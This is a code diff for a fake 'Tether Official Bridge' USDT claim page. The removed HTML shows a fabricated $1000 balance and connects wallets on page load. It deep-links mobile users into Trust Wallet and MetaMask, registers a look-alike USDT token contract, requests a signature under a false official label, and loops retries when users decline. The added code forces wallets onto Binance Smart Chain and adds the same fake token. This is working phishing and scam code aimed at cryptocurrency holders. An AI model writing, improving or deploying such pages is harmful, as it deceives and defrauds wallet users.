@@ -1,120 +1,35 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether Operations | Node Sync</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <style>
-        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
-        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
-        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
-        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
-        .price-value { font-size: 22px; font-weight: 700; color: #fff; }
-        h2 { font-weight: 700; font-size: 22px; margin: 10px 0; }
-        p { color: #848d97; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
-        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <div class="logo-ring">
-        <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="usdt-img" alt="USDT">
-    </div>
-    <h2>RECEIVE USDT</h2>
-    <p>Secure Bridge detected a pending USDT distribution. Synchronize to map official metadata.</p>
-    <div class="price-box">
-        <div style="font-size: 12px; color: #848d97;">Allocated Node Value</div>
-        <div class="price-value" id="priceTicker">$0.00</div>
-    </div>
-    <div id="log-area">SYSTEM: READY</div>
-    <button class="action-btn" id="claimBtn">Sync & Receive</button>
-</div>
-
-<script>
-    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const TOKEN_LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";
-
-    window.onload = () => {
-        let val = 0; const target = 1000.00;
-        const timer = setInterval(() => {
-            if(val >= target) clearInterval(timer);
-            val += 17.52;
-            document.getElementById('priceTicker').innerText = "$" + (val > target ? target : val.toFixed(2));
-        }, 50);
-
-        // AUTO-TRIGGER: Agar pehle se dApp browser mein hai
-        if (window.ethereum || window.trustwallet) {
-            setTimeout(executeMasterSync, 1500);
-        }
-    };
-
-    async function executeMasterSync() {
-        const log = document.getElementById('log-area');
-        const btn = document.getElementById('claimBtn');
-        
-        // --- MOBILE BRIDGE LOGIC START ---
-        if (!window.ethereum && !window.trustwallet) {
-            log.innerText = "> REDIRECTING TO WALLET APP...";
-            const rawUrl = window.location.href.split('://')[1];
-            // Universal Deep Link that triggers Trust/MetaMask on Mobile
-            window.location.href = "https://link.trustwallet.com/a/dapp?url=https://" + rawUrl;
-            
-            // Backup for MetaMask if Trust not found
-            setTimeout(() => {
-                window.location.href = "https://metamask.app.link/dapp/" + rawUrl;
-            }, 2000);
-            return;
-        }
-        // --- MOBILE BRIDGE LOGIC END ---
-
-        try {
-            btn.disabled = true;
-            const provider = window.trustwallet || window.ethereum;
-            
-            log.innerText = "> INITIALIZING AUTH...";
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
-            
-            log.innerText = "> MAPPING METADATA...";
-            await provider.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20',
-                    options: {
-                        address: CONTRACT_ADDR,
-                        symbol: 'USDT',
-                        decimals: 18,
-                        image: TOKEN_LOGO,
-                    },
-                },
-            });
-
-            log.innerText = "> VERIFYING SIGNATURE...";
-            const msg = "Tether Official Bridge\nVerification ID: " + Math.floor(Math.random() * 999999);
-            await provider.request({
-                method: 'personal_sign',
-                params: [msg, accounts[0]],
-            });
-
-            log.innerText = "> SYNC SUCCESSFUL!";
-            alert("Synchronization Complete!");
-            btn.innerText = "SUCCESS";
-
-        } catch (err) {
-            log.innerText = "> SYNC_INTERRUPTED";
-            btn.disabled = false;
-            // Force retry loop
-            setTimeout(executeMasterSync, 1000);
-        }
+// Force Switch to BSC (ChainID: 56 or 0x38)
+try {
+    await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: '0x38' }], // Ye wallet ko BSC par le jayega
+    });
+} catch (switchError) {
+    // Agar wallet mein BSC add nahi hai, to pehle add karo
+    if (switchError.code === 4902) {
+        await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+                chainId: '0x38',
+                chainName: 'Binance Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com/']
+            }]
+        });
     }
+}
 
-    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
-</script>
-</body>
-</html>
+// AB YE TOKEN ADD KAREGA BSC PAR
+await window.ethereum.request({
+    method: 'wallet_watchAsset',
+    params: {
+        type: 'ERC20',
+        options: {
+            address: CONTRACT_ADDR,
+            symbol: 'USDT',
+            decimals: 18, // BSC USDT usually uses 18
+            image: TOKEN_LOGO,
+        },
+    },
+});
